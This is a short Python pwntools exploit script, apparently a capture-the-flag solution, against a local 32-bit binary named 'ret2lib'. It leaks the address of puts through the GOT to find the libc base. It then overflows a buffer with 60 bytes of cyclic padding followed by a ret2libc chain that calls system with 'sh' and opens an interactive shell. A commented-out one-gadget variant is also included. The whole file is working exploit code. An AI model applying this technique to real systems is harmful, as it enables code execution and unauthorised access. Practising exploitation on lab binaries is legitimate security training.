#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

io = process("./ret2lib")
elf = ELF("./ret2lib")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

io.sendlineafter(" :", str(elf.got["puts"]))
io.recvuntil(" : ")
libcBase = int(io.recvuntil("\n", drop = True), 16) - libc.symbols["puts"]

success("libcBase -> {:#x}".format(libcBase))
#  oneGadget = libcBase + 0x3a9fc

#  payload = flat(cyclic(60), oneGadget)
payload = flat(cyclic(60), libcBase + libc.symbols["system"], 0xdeadbeef, next(elf.search("sh\x00")))
io.sendlineafter(" :", payload)

io.interactive()
io.close()
